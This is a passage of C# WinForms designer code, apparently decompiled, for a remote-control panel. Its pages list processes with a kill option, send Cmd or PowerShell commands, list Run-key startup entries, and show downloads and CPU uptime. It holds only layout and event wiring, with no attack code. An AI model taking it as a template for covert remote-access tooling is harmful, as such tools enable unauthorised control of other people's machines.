        this.ListProcess.ShowEditingIcon = false;
        this.ListProcess.ShowRowErrors = false;
        this.ListProcess.Size = new System.Drawing.Size(737, 465);
        this.ListProcess.TabIndex = 660;
        this.ListProcess.Theme = Guna.UI2.WinForms.Enums.DataGridViewPresetThemes.Light;
        this.ListProcess.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListProcess.ThemeStyle.AlternatingRowsStyle.Font = null;
        this.ListProcess.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
        this.ListProcess.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
        this.ListProcess.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
        this.ListProcess.ThemeStyle.BackColor = System.Drawing.Color.White;
        this.ListProcess.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListProcess.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        this.ListProcess.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        this.ListProcess.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListProcess.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.Black;
        this.ListProcess.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListProcess.ThemeStyle.HeaderStyle.Height = 30;
        this.ListProcess.ThemeStyle.ReadOnly = true;
        this.ListProcess.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.White;
        this.ListProcess.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListProcess.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListProcess.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.Black;
        this.ListProcess.ThemeStyle.RowsStyle.Height = 22;
        this.ListProcess.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ListProcess.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
        this.dataGridViewImageColumn4.HeaderText = "";
        this.dataGridViewImageColumn4.Name = "dataGridViewImageColumn4";
        this.dataGridViewImageColumn4.ReadOnly = true;
        this.dataGridViewImageColumn4.Width = 5;
        this.dataGridViewTextBoxColumn9.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        dataGridViewCellStyle20.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        this.dataGridViewTextBoxColumn9.DefaultCellStyle = dataGridViewCellStyle20;
        this.dataGridViewTextBoxColumn9.HeaderText = "Name";
        this.dataGridViewTextBoxColumn9.Name = "dataGridViewTextBoxColumn9";
        this.dataGridViewTextBoxColumn9.ReadOnly = true;
        this.dataGridViewTextBoxColumn9.Width = 68;
        this.dataGridViewTextBoxColumn10.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.dataGridViewTextBoxColumn10.HeaderText = "PID";
        this.dataGridViewTextBoxColumn10.Name = "dataGridViewTextBoxColumn10";
        this.dataGridViewTextBoxColumn10.ReadOnly = true;
        this.dataGridViewTextBoxColumn10.Width = 54;
        this.dataGridViewTextBoxColumn11.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
        this.dataGridViewTextBoxColumn11.HeaderText = "Path";
        this.dataGridViewTextBoxColumn11.Name = "dataGridViewTextBoxColumn11";
        this.dataGridViewTextBoxColumn11.ReadOnly = true;
        this.contextTaskManager.ImageScalingSize = new System.Drawing.Size(20, 20);
        this.contextTaskManager.Items.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.RefreshTaskManager, this.RestartProcess, this.KillProcess });
        this.contextTaskManager.Name = "ContexServices";
        this.contextTaskManager.Size = new System.Drawing.Size(118, 82);
        this.RefreshTaskManager.BackColor = System.Drawing.Color.White;
        this.RefreshTaskManager.Image = (System.Drawing.Image)resources.GetObject("RefreshTaskManager.Image");
        this.RefreshTaskManager.Name = "RefreshTaskManager";
        this.RefreshTaskManager.Size = new System.Drawing.Size(117, 26);
        this.RefreshTaskManager.Text = "Refresh";
        this.RefreshTaskManager.Click += new System.EventHandler(RefreshTaskManager_Click);
        this.RestartProcess.BackColor = System.Drawing.Color.White;
        this.RestartProcess.Image = (System.Drawing.Image)resources.GetObject("RestartProcess.Image");
        this.RestartProcess.Name = "RestartProcess";
        this.RestartProcess.Size = new System.Drawing.Size(117, 26);
        this.RestartProcess.Text = "Restart";
        this.RestartProcess.Click += new System.EventHandler(RestartProcess_Click);
        this.KillProcess.BackColor = System.Drawing.Color.White;
        this.KillProcess.Image = (System.Drawing.Image)resources.GetObject("KillProcess.Image");
        this.KillProcess.Name = "KillProcess";
        this.KillProcess.Size = new System.Drawing.Size(117, 26);
        this.KillProcess.Text = "Kill";
        this.KillProcess.Click += new System.EventHandler(KillProcess_Click);
        this.PageCmd.Controls.Add(this.Panel8);
        this.PageCmd.Location = new System.Drawing.Point(4, 4);
        this.PageCmd.Name = "PageCmd";
        this.PageCmd.Size = new System.Drawing.Size(737, 465);
        this.PageCmd.TabIndex = 4;
        this.PageCmd.Text = "Cmd";
        this.PageCmd.UseVisualStyleBackColor = true;
        this.Panel8.Controls.Add(this.PowerCommand);
        this.Panel8.Controls.Add(this.CommandType);
        this.Panel8.Controls.Add(this.label1);
        this.Panel8.Controls.Add(this.BoxCmd);
        this.Panel8.Controls.Add(this.CommandCmd);
        this.Panel8.Dock = System.Windows.Forms.DockStyle.Fill;
        this.Panel8.Location = new System.Drawing.Point(0, 0);
        this.Panel8.Name = "Panel8";
        this.Panel8.Size = new System.Drawing.Size(737, 465);
        this.Panel8.TabIndex = 1;
        this.PowerCommand.Animated = true;
        this.PowerCommand.BorderRadius = 2;
        this.PowerCommand.CheckedState.Parent = this.PowerCommand;
        this.PowerCommand.CustomImages.Parent = this.PowerCommand;
        this.PowerCommand.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.PowerCommand.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.PowerCommand.Font = new System.Drawing.Font("Consolas", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.PowerCommand.ForeColor = System.Drawing.Color.White;
        this.PowerCommand.HoverState.Parent = this.PowerCommand;
        this.PowerCommand.Location = new System.Drawing.Point(10, 66);
        this.PowerCommand.Name = "PowerCommand";
        this.PowerCommand.ShadowDecoration.Parent = this.PowerCommand;
        this.PowerCommand.Size = new System.Drawing.Size(98, 27);
        this.PowerCommand.TabIndex = 661;
        this.PowerCommand.Text = "Start";
        this.PowerCommand.Click += new System.EventHandler(PowerCommand_Click);
        this.CommandType.BackColor = System.Drawing.Color.Transparent;
        this.CommandType.BackgroundColor = System.Drawing.Color.White;
        this.CommandType.BorderColor = System.Drawing.Color.Silver;
        this.CommandType.BorderRadius = 1;
        this.CommandType.Color = System.Drawing.Color.Silver;
        this.CommandType.Direction = Bunifu.UI.WinForms.BunifuDropdown.Directions.Down;
        this.CommandType.DisabledBackColor = System.Drawing.Color.FromArgb(240, 240, 240);
        this.CommandType.DisabledBorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        this.CommandType.DisabledColor = System.Drawing.Color.FromArgb(240, 240, 240);
        this.CommandType.DisabledForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        this.CommandType.DisabledIndicatorColor = System.Drawing.Color.DarkGray;
        this.CommandType.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
        this.CommandType.DropdownBorderThickness = Bunifu.UI.WinForms.BunifuDropdown.BorderThickness.Thin;
        this.CommandType.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
        this.CommandType.DropDownTextAlign = Bunifu.UI.WinForms.BunifuDropdown.TextAlign.Left;
        this.CommandType.FillDropDown = true;
        this.CommandType.FillIndicator = false;
        this.CommandType.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
        this.CommandType.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.CommandType.ForeColor = System.Drawing.Color.Black;
        this.CommandType.FormattingEnabled = true;
        this.CommandType.Icon = null;
        this.CommandType.IndicatorAlignment = Bunifu.UI.WinForms.BunifuDropdown.Indicator.Right;
        this.CommandType.IndicatorColor = System.Drawing.Color.DarkGray;
        this.CommandType.IndicatorLocation = Bunifu.UI.WinForms.BunifuDropdown.Indicator.Right;
        this.CommandType.IndicatorThickness = 2;
        this.CommandType.IsDropdownOpened = false;
        this.CommandType.ItemBackColor = System.Drawing.Color.White;
        this.CommandType.ItemBorderColor = System.Drawing.Color.White;
        this.CommandType.ItemForeColor = System.Drawing.Color.Black;
        this.CommandType.ItemHeight = 20;
        this.CommandType.ItemHighLightColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.CommandType.ItemHighLightForeColor = System.Drawing.Color.White;
        this.CommandType.Items.AddRange(new object[2] { "Cmd", "PowerShell" });
        this.CommandType.ItemTopMargin = 3;
        this.CommandType.Location = new System.Drawing.Point(10, 30);
        this.CommandType.Name = "CommandType";
        this.CommandType.Size = new System.Drawing.Size(242, 26);
        this.CommandType.TabIndex = 659;
        this.CommandType.Text = null;
        this.CommandType.TextAlignment = Bunifu.UI.WinForms.BunifuDropdown.TextAlign.Left;
        this.CommandType.TextLeftMargin = 5;
        this.CommandType.SelectedIndexChanged += new System.EventHandler(CommandType_SelectedIndexChanged);
        this.label1.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label1.AutoSize = true;
        this.label1.BackColor = System.Drawing.Color.Transparent;
        this.label1.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label1.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.label1.ForeColor = System.Drawing.Color.Gray;
        this.label1.Location = new System.Drawing.Point(10, 10);
        this.label1.Name = "label1";
        this.label1.Size = new System.Drawing.Size(31, 15);
        this.label1.TabIndex = 660;
        this.label1.Text = "Type";
        this.BoxCmd.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.BoxCmd.BackColor = System.Drawing.Color.Black;
        this.BoxCmd.Font = new System.Drawing.Font("Lucida Console", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.BoxCmd.ForeColor = System.Drawing.Color.White;
        this.BoxCmd.Location = new System.Drawing.Point(10, 106);
        this.BoxCmd.Name = "BoxCmd";
        this.BoxCmd.ReadOnly = true;
        this.BoxCmd.Size = new System.Drawing.Size(720, 313);
        this.BoxCmd.TabIndex = 604;
        this.BoxCmd.Text = "";
        this.CommandCmd.AcceptsReturn = false;
        this.CommandCmd.AcceptsTab = false;
        this.CommandCmd.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.CommandCmd.AnimationSpeed = 200;
        this.CommandCmd.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.CommandCmd.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.CommandCmd.AutoSizeHeight = true;
        this.CommandCmd.BackColor = System.Drawing.Color.Transparent;
        this.CommandCmd.BackgroundImage = (System.Drawing.Image)resources.GetObject("CommandCmd.BackgroundImage");
        this.CommandCmd.BorderColorActive = System.Drawing.Color.FromArgb(87, 59, 255);
        this.CommandCmd.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
        this.CommandCmd.BorderColorHover = System.Drawing.Color.FromArgb(255, 192, 128);
        this.CommandCmd.BorderColorIdle = System.Drawing.Color.Silver;
        this.CommandCmd.BorderRadius = 2;
        this.CommandCmd.BorderThickness = 1;
        this.CommandCmd.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.CommandCmd.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.CommandCmd.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25f);
        this.CommandCmd.DefaultText = "";
        this.CommandCmd.FillColor = System.Drawing.Color.White;
        this.CommandCmd.HideSelection = true;
        this.CommandCmd.IconLeft = null;
        this.CommandCmd.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.CommandCmd.IconPadding = 10;
        this.CommandCmd.IconRight = null;
        this.CommandCmd.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.CommandCmd.Lines = new string[0];
        this.CommandCmd.Location = new System.Drawing.Point(10, 425);
        this.CommandCmd.MaxLength = 32767;
        this.CommandCmd.MinimumSize = new System.Drawing.Size(1, 1);
        this.CommandCmd.Modified = false;
        this.CommandCmd.Multiline = false;
        this.CommandCmd.Name = "CommandCmd";
        stateProperties13.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        stateProperties13.FillColor = System.Drawing.Color.Empty;
        stateProperties13.ForeColor = System.Drawing.Color.Empty;
        stateProperties13.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.CommandCmd.OnActiveState = stateProperties13;
        stateProperties14.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        stateProperties14.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
        stateProperties14.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        stateProperties14.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.CommandCmd.OnDisabledState = stateProperties14;
        stateProperties15.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        stateProperties15.FillColor = System.Drawing.Color.Empty;
        stateProperties15.ForeColor = System.Drawing.Color.Empty;
        stateProperties15.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.CommandCmd.OnHoverState = stateProperties15;
        stateProperties16.BorderColor = System.Drawing.Color.Silver;
        stateProperties16.FillColor = System.Drawing.Color.White;
        stateProperties16.ForeColor = System.Drawing.Color.Empty;
        stateProperties16.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.CommandCmd.OnIdleState = stateProperties16;
        this.CommandCmd.Padding = new System.Windows.Forms.Padding(3);
        this.CommandCmd.PasswordChar = '\0';
        this.CommandCmd.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.CommandCmd.PlaceholderText = "Command";
        this.CommandCmd.ReadOnly = false;
        this.CommandCmd.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.CommandCmd.SelectedText = "";
        this.CommandCmd.SelectionLength = 0;
        this.CommandCmd.SelectionStart = 0;
        this.CommandCmd.ShortcutsEnabled = true;
        this.CommandCmd.Size = new System.Drawing.Size(720, 28);
        this.CommandCmd.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.CommandCmd.TabIndex = 603;
        this.CommandCmd.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.CommandCmd.TextMarginBottom = 0;
        this.CommandCmd.TextMarginLeft = 3;
        this.CommandCmd.TextMarginTop = 1;
        this.CommandCmd.TextPlaceholder = "Command";
        this.CommandCmd.UseSystemPasswordChar = false;
        this.CommandCmd.WordWrap = true;
        this.CommandCmd.KeyDown += new System.Windows.Forms.KeyEventHandler(CommandCmd_KeyDown);
        this.PageStartup.Controls.Add(this.Panel9);
        this.PageStartup.Location = new System.Drawing.Point(4, 4);
        this.PageStartup.Name = "PageStartup";
        this.PageStartup.Size = new System.Drawing.Size(737, 465);
        this.PageStartup.TabIndex = 5;
        this.PageStartup.Text = "Startup";
        this.PageStartup.UseVisualStyleBackColor = true;
        this.Panel9.Controls.Add(this.ListStartup);
        this.Panel9.Dock = System.Windows.Forms.DockStyle.Fill;
        this.Panel9.Location = new System.Drawing.Point(0, 0);
        this.Panel9.Name = "Panel9";
        this.Panel9.Size = new System.Drawing.Size(737, 465);
        this.Panel9.TabIndex = 1;
        this.ListStartup.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.ListStartup.Columns.AddRange(new System.Windows.Forms.ColumnHeader[2] { this.NameStartup, this.TypeStartup });
        this.ListStartup.ContextMenuStrip = this.ContexListStartup;
        this.ListStartup.Dock = System.Windows.Forms.DockStyle.Fill;
        this.ListStartup.FullRowSelect = true;
        listViewGroup5.Header = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        listViewGroup5.Name = "Group1";
        listViewGroup6.Header = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce";
        listViewGroup6.Name = "Group2";
        listViewGroup7.Header = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run";
        listViewGroup7.Name = "Group3";
        listViewGroup8.Header = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        listViewGroup8.Name = "Group4";
        listViewGroup9.Header = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce";
        listViewGroup9.Name = "Group5";
        listViewGroup10.Header = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run";
        listViewGroup10.Name = "Group6";
        listViewGroup11.Header = "Startup Folder";
        listViewGroup11.Name = "Group7";
        this.ListStartup.Groups.AddRange(new System.Windows.Forms.ListViewGroup[7] { listViewGroup5, listViewGroup6, listViewGroup7, listViewGroup8, listViewGroup9, listViewGroup10, listViewGroup11 });
        this.ListStartup.HideSelection = false;
        this.ListStartup.LargeImageList = this.ImageListStartup;
        this.ListStartup.Location = new System.Drawing.Point(0, 0);
        this.ListStartup.Name = "ListStartup";
        this.ListStartup.Size = new System.Drawing.Size(737, 465);
        this.ListStartup.SmallImageList = this.ImageListStartup;
        this.ListStartup.TabIndex = 613;
        this.ListStartup.UseCompatibleStateImageBehavior = false;
        this.ListStartup.View = System.Windows.Forms.View.Details;
        this.NameStartup.Text = "Name";
        this.NameStartup.Width = 231;
        this.TypeStartup.Text = "Type";
        this.TypeStartup.Width = 505;
        this.ContexListStartup.ImageScalingSize = new System.Drawing.Size(20, 20);
        this.ContexListStartup.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.RefreshListStartup, this.DeleteKeyStartup });
        this.ContexListStartup.Name = "ContexServices";
        this.ContexListStartup.Size = new System.Drawing.Size(118, 56);
        this.RefreshListStartup.BackColor = System.Drawing.Color.White;
        this.RefreshListStartup.Image = (System.Drawing.Image)resources.GetObject("RefreshListStartup.Image");
        this.RefreshListStartup.Name = "RefreshListStartup";
        this.RefreshListStartup.Size = new System.Drawing.Size(117, 26);
        this.RefreshListStartup.Text = "Refresh";
        this.RefreshListStartup.Click += new System.EventHandler(RefreshListStartup_Click);
        this.DeleteKeyStartup.BackColor = System.Drawing.Color.White;
        this.DeleteKeyStartup.Image = (System.Drawing.Image)resources.GetObject("DeleteKeyStartup.Image");
        this.DeleteKeyStartup.Name = "DeleteKeyStartup";
        this.DeleteKeyStartup.Size = new System.Drawing.Size(117, 26);
        this.DeleteKeyStartup.Text = "Delete";
        this.DeleteKeyStartup.Click += new System.EventHandler(DeleteKeyStartup_Click);
        this.ImageListStartup.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("ImageListStartup.ImageStream");
        this.ImageListStartup.TransparentColor = System.Drawing.Color.Transparent;
        this.ImageListStartup.Images.SetKeyName(0, "176.png");
        this.ImageListStartup.Images.SetKeyName(1, "177.png");
        this.ImageListStartup.Images.SetKeyName(2, "178.png");
        this.PageDownload.Controls.Add(this.Panel10);
        this.PageDownload.Location = new System.Drawing.Point(4, 4);
        this.PageDownload.Name = "PageDownload";
        this.PageDownload.Size = new System.Drawing.Size(737, 465);
        this.PageDownload.TabIndex = 7;
        this.PageDownload.Text = "Download";
        this.PageDownload.UseVisualStyleBackColor = true;
        this.Panel10.Controls.Add(this.LayoutPanelDownload);
        this.Panel10.Dock = System.Windows.Forms.DockStyle.Fill;
        this.Panel10.Location = new System.Drawing.Point(0, 0);
        this.Panel10.Name = "Panel10";
        this.Panel10.Size = new System.Drawing.Size(737, 465);
        this.Panel10.TabIndex = 2;
        this.LayoutPanelDownload.AutoScroll = true;
        this.LayoutPanelDownload.Controls.Add(this.LabelPageDownload);
        this.LayoutPanelDownload.Dock = System.Windows.Forms.DockStyle.Fill;
        this.LayoutPanelDownload.Location = new System.Drawing.Point(0, 0);
        this.LayoutPanelDownload.Name = "LayoutPanelDownload";
        this.LayoutPanelDownload.Size = new System.Drawing.Size(737, 465);
        this.LayoutPanelDownload.TabIndex = 0;
        this.LabelPageDownload.AllowParentOverrides = false;
        this.LabelPageDownload.AutoEllipsis = false;
        this.LabelPageDownload.BackColor = System.Drawing.Color.White;
        this.LabelPageDownload.CursorType = null;
        this.LabelPageDownload.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.LabelPageDownload.ForeColor = System.Drawing.Color.Black;
        this.LabelPageDownload.Location = new System.Drawing.Point(3, 3);
        this.LabelPageDownload.Name = "LabelPageDownload";
        this.LabelPageDownload.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.LabelPageDownload.Size = new System.Drawing.Size(133, 15);
        this.LabelPageDownload.TabIndex = 607;
        this.LabelPageDownload.Text = "Downloads box is empty!";
        this.LabelPageDownload.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.LabelPageDownload.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.PageLogs.Controls.Add(this.Panel11);
        this.PageLogs.Location = new System.Drawing.Point(4, 4);
        this.PageLogs.Name = "PageLogs";
        this.PageLogs.Size = new System.Drawing.Size(737, 465);
        this.PageLogs.TabIndex = 8;
        this.PageLogs.Text = "Performance";
        this.PageLogs.UseVisualStyleBackColor = true;
        this.Panel11.Controls.Add(this.PowerPerformance);
        this.Panel11.Controls.Add(this.bunifuLabel4);
        this.Panel11.Controls.Add(this.CPU);
        this.Panel11.Controls.Add(this.bunifuPanel2);
        this.Panel11.Controls.Add(this.bunifuPanel1);
        this.Panel11.Controls.Add(this.bunifuPanel11);
        this.Panel11.Controls.Add(this.pictureBox1);
        this.Panel11.Dock = System.Windows.Forms.DockStyle.Fill;
        this.Panel11.Location = new System.Drawing.Point(0, 0);
        this.Panel11.Name = "Panel11";
        this.Panel11.Size = new System.Drawing.Size(737, 465);
        this.Panel11.TabIndex = 2;
        this.PowerPerformance.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.PowerPerformance.Animated = true;
        this.PowerPerformance.BorderRadius = 2;
        this.PowerPerformance.CheckedState.Parent = this.PowerPerformance;
        this.PowerPerformance.CustomImages.Parent = this.PowerPerformance;
        this.PowerPerformance.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.PowerPerformance.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.PowerPerformance.Font = new System.Drawing.Font("Consolas", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.PowerPerformance.ForeColor = System.Drawing.Color.White;
        this.PowerPerformance.HoverState.Parent = this.PowerPerformance;
        this.PowerPerformance.Location = new System.Drawing.Point(574, 43);
        this.PowerPerformance.Name = "PowerPerformance";
        this.PowerPerformance.ShadowDecoration.Parent = this.PowerPerformance;
        this.PowerPerformance.Size = new System.Drawing.Size(98, 27);
        this.PowerPerformance.TabIndex = 657;
        this.PowerPerformance.Text = "Start";
        this.PowerPerformance.Click += new System.EventHandler(PowerPerformance_Click);
        this.bunifuLabel4.AllowParentOverrides = false;
        this.bunifuLabel4.Anchor = System.Windows.Forms.AnchorStyles.None;
        this.bunifuLabel4.AutoEllipsis = false;
        this.bunifuLabel4.AutoSize = false;
        this.bunifuLabel4.CursorType = null;
        this.bunifuLabel4.Font = new System.Drawing.Font("Arial", 10f);
        this.bunifuLabel4.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
        this.bunifuLabel4.Location = new System.Drawing.Point(67, 271);
        this.bunifuLabel4.Name = "bunifuLabel4";
        this.bunifuLabel4.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel4.Size = new System.Drawing.Size(615, 22);
        this.bunifuLabel4.TabIndex = 599;
        this.bunifuLabel4.Text = "CPU performance measurement";
        this.bunifuLabel4.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
        this.bunifuLabel4.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.CPU.AllowParentOverrides = false;
        this.CPU.Anchor = System.Windows.Forms.AnchorStyles.None;
        this.CPU.AutoEllipsis = false;
        this.CPU.AutoSize = false;
        this.CPU.CursorType = null;
        this.CPU.Font = new System.Drawing.Font("Segoe UI", 72f, System.Drawing.FontStyle.Bold);
        this.CPU.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
        this.CPU.Location = new System.Drawing.Point(67, 166);
        this.CPU.Name = "CPU";
        this.CPU.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.CPU.Size = new System.Drawing.Size(615, 99);
        this.CPU.TabIndex = 598;
        this.CPU.Text = "0%";
        this.CPU.TextAlignment = System.Drawing.ContentAlignment.MiddleCenter;
        this.CPU.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.bunifuPanel2.Anchor = System.Windows.Forms.AnchorStyles.None;
        this.bunifuPanel2.BackgroundColor = System.Drawing.Color.FromArgb(249, 205, 11);
        this.bunifuPanel2.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuPanel2.BackgroundImage");
        this.bunifuPanel2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.bunifuPanel2.BorderColor = System.Drawing.Color.FromArgb(249, 205, 11);
        this.bunifuPanel2.BorderRadius = 30;
        this.bunifuPanel2.BorderThickness = 1;
        this.bunifuPanel2.Controls.Add(this.TimeSystem);
        this.bunifuPanel2.Controls.Add(this.guna2GradientButton_0);
        this.bunifuPanel2.Controls.Add(this.label9);
        this.bunifuPanel2.Location = new System.Drawing.Point(481, 378);
        this.bunifuPanel2.Name = "bunifuPanel2";
        this.bunifuPanel2.ShowBorders = true;
        this.bunifuPanel2.Size = new System.Drawing.Size(201, 54);
        this.bunifuPanel2.TabIndex = 597;
        this.TimeSystem.AllowParentOverrides = false;
        this.TimeSystem.AutoEllipsis = false;
        this.TimeSystem.AutoSize = false;
        this.TimeSystem.CursorType = null;
        this.TimeSystem.Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Bold);
        this.TimeSystem.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
        this.TimeSystem.Location = new System.Drawing.Point(61, 27);
        this.TimeSystem.Name = "TimeSystem";
        this.TimeSystem.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.TimeSystem.Size = new System.Drawing.Size(130, 19);
        this.TimeSystem.TabIndex = 589;
        this.TimeSystem.Text = "656m";
        this.TimeSystem.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.TimeSystem.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.guna2GradientButton_0.Animated = true;
        this.guna2GradientButton_0.AutoRoundedCorners = true;
        this.guna2GradientButton_0.BackColor = System.Drawing.Color.Transparent;
        this.guna2GradientButton_0.BorderRadius = 20;
        this.guna2GradientButton_0.CheckedState.BorderColor = System.Drawing.Color.White;
        this.guna2GradientButton_0.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.guna2GradientButton_0.CheckedState.FillColor = System.Drawing.Color.White;
        this.guna2GradientButton_0.CheckedState.FillColor2 = System.Drawing.Color.White;
        this.guna2GradientButton_0.CheckedState.ForeColor = System.Drawing.Color.White;
        this.guna2GradientButton_0.CheckedState.Parent = this.guna2GradientButton_0;
        this.guna2GradientButton_0.Cursor = System.Windows.Forms.Cursors.Hand;
        this.guna2GradientButton_0.CustomImages.Parent = this.guna2GradientButton_0;
        this.guna2GradientButton_0.FillColor = System.Drawing.Color.White;
        this.guna2GradientButton_0.FillColor2 = System.Drawing.Color.White;
        this.guna2GradientButton_0.Font = new System.Drawing.Font("Consolas", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.guna2GradientButton_0.ForeColor = System.Drawing.SystemColors.InfoText;
        this.guna2GradientButton_0.HoverState.Parent = this.guna2GradientButton_0;
        this.guna2GradientButton_0.Image = (System.Drawing.Image)resources.GetObject("guna2GradientButton2.Image");
        this.guna2GradientButton_0.ImageSize = new System.Drawing.Size(32, 32);
        this.guna2GradientButton_0.Location = new System.Drawing.Point(7, 5);
        this.guna2GradientButton_0.Name = "guna2GradientButton2";
        this.guna2GradientButton_0.ShadowDecoration.Parent = this.guna2GradientButton_0;
        this.guna2GradientButton_0.Size = new System.Drawing.Size(43, 43);
        this.guna2GradientButton_0.TabIndex = 578;
        this.label9.AutoSize = true;
        this.label9.BackColor = System.Drawing.Color.Transparent;
        this.label9.Font = new System.Drawing.Font("Segoe UI Semibold", 9f, System.Drawing.FontStyle.Bold);
        this.label9.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
        this.label9.Location = new System.Drawing.Point(56, 7);
        this.label9.Name = "label9";
        this.label9.Size = new System.Drawing.Size(94, 15);
        this.label9.TabIndex = 588;
        this.label9.Text = "Up Time System";
        this.bunifuPanel1.Anchor = System.Windows.Forms.AnchorStyles.None;
        this.bunifuPanel1.BackgroundColor = System.Drawing.Color.FromArgb(249, 205, 11);
